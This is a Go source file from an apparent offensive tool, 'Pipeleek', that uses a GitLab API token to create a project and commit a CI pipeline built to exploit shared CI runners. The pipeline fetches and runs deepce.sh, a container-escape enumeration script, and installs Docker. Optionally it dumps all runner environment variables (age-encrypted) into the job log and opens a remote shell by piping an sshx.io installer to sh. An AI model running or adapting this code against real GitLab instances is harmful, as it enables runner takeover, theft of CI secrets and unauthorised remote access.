package runners

import (
	"github.com/rs/zerolog/log"
	gogit "gitlab.com/gitlab-org/api/client-go"
	ci "gitlab.com/mitchenielsen/gitlab-ci-go"
)

var exploitScript = []string{
	"echo \"Pipeleek exploit job\"",
	"id",
	"whoami",
	"curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh",
	"chmod +x deepce.sh",
	"./deepce.sh",
}

var exploitJobCOnfig = ci.JobConfig{
	Stage: "exploit",
	Image: "ubuntu:latest",
	BeforeScript: []string{
		"apt update && apt install curl libcap2-bin -y",
		"curl -fsSL https://get.docker.com -o get-docker.sh",
		"sh ./get-docker.sh",
	},
}

// ExploitRunners creates a project with CI/CD jobs to exploit available runners
func ExploitRunners(runnerTags []string, dry bool, shell bool, gitlabApiToken string, gitlabUrl string, ageEncryptionPublicKey string, repoName string) {

	gitlabCiYml := generateCIYml(runnerTags, shell, ageEncryptionPublicKey)

	if len(ageEncryptionPublicKey) > 0 {
		log.Info().Msg("Decrypt age (https://github.com/FiloSottile/age/releases) output locally using: age --decrypt -i key.txt age_output.txt")
	}

	if dry {
		log.Info().Msg("Generated .gitlab-ci.yml")
		log.Info().Msg(gitlabCiYml)
		log.Info().Msg("Create your project and .gitlab-ci.yml manually")
		return
	}

	git, err := gogit.NewClient(gitlabApiToken, gogit.WithBaseURL(gitlabUrl))
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitlab client")
	}

	opts := &gogit.CreateProjectOptions{
		Name:        gogit.Ptr(repoName),
		JobsEnabled: gogit.Ptr(true),
	}

	project, _, err := git.Projects.CreateProject(opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating project")
	}

	log.Info().Str("name", project.Name).Str("url", project.WebURL).Msg("Created project")

	fileOpts := &gogit.CreateFileOptions{
		Branch:        gogit.Ptr("main"),
		Content:       gogit.Ptr(gitlabCiYml),
		CommitMessage: gogit.Ptr("Pipeleek create .gitlab-ci.yml"),
	}
	fileInfo, _, err := git.RepositoryFiles.CreateFile(project.ID, ".gitlab-ci.yml", fileOpts)

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Creating .gitlab-ci.yml failed")
	}

	log.Info().Str("file", fileInfo.FilePath).Msg("Created .gitlab-ci.yml")
	log.Info().Str("url", project.WebURL+"/-/pipelines").Msg("Check pipeline logs manually")
	log.Info().Msg("Make sure to delete the project when done")
}

func generateCIYml(runnerTags []string, shell bool, ageEncryptionPublicKey string) string {
	yml := ci.CI{
		Globals: ci.Globals{Stages: []string{"exploit"}},
		Jobs:    map[string]ci.JobConfig{},
	}

	job := exploitJobCOnfig
	job.Script = exploitScript

	if len(ageEncryptionPublicKey) > 0 {
		job.Script = append(job.Script, "curl -s https://api.github.com/repos/FiloSottile/age/releases/latest | \\\n grep download/.*linux-amd64.tar.gz | \\\n cut -d : -f 2,3 | \\\n xargs curl -O -L")
		job.Script = append(job.Script, "tar -xzvf *linux-amd64.tar.gz")
		job.Script = append(job.Script, "env |\\\n ./age/age -a -r "+ageEncryptionPublicKey)
	}

	if shell {
		job.Script = append(job.Script, "curl -sSf https://sshx.io/get | sh -s run")
	}

	if len(runnerTags) == 0 {
		yml.Jobs["pipeleek-job"] = job
	} else {
		for _, tag := range runnerTags {
			job.Tags = []string{tag}
			yml.Jobs["pipeleek-job-"+tag] = job
		}

	}

	yamlData, err := yml.Build()

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed marshalling yml")
	}

	return string(yamlData)
}
